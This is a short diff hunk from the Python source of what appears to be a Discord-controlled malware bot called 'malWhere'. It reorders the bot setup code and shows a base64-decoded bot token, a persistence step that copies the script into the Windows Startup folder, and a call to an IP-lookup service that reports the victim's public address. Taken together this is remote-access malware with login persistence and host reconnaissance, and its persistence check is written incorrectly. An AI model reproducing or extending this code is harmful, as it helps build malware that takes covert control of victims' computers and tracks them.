@@ -40,13 +40,13 @@ sample_string_bytes = base64.b64decode(base64_bytes)
 decryp5 = sample_string_bytes.decode("ascii")
 TOKEN=decryp5
 
-malWhere = commands.Bot(command_prefix='$')
-malWhere.remove_command('help')
-guild = malWhere.get_guild(<guild-id>)
-
 persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
 if not persistencefile:
   shutil.copy(__file__, "startup.py")
+
+malWhere = commands.Bot(command_prefix='$')
+malWhere.remove_command('help')
+guild = malWhere.get_guild(<guild-id>)
 
 r = requests.get('https://api.ipify.org?format=json')
 response=r.json()
